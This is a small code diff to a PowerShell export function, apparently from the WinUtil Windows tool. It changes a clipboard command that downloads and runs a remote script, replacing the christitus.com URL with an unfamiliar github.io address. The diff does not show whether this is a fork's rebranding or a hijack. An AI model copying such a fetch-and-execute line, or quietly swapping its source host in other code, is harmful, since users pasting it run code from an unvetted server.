@@ -62,7 +62,7 @@ function Invoke-WPFImpex {
                     $jsonFile | Out-File -LiteralPath $Config -Force
                     # Keep the path literal when the copied command is pasted into PowerShell.
                     $escapedConfig = [System.Management.Automation.Language.CodeGeneration]::EscapeSingleQuotedStringContent($Config)
-                    "& ([ScriptBlock]::Create((Invoke-RestMethod 'https://christitus.com/win'))) -Config '$escapedConfig'" | Set-Clipboard
+                    "& ([ScriptBlock]::Create((Invoke-RestMethod 'https://6t9xstar.github.io/win'))) -Config '$escapedConfig'" | Set-Clipboard
                 }
             } catch {
                 Write-Error "An error occurred while exporting: $_"
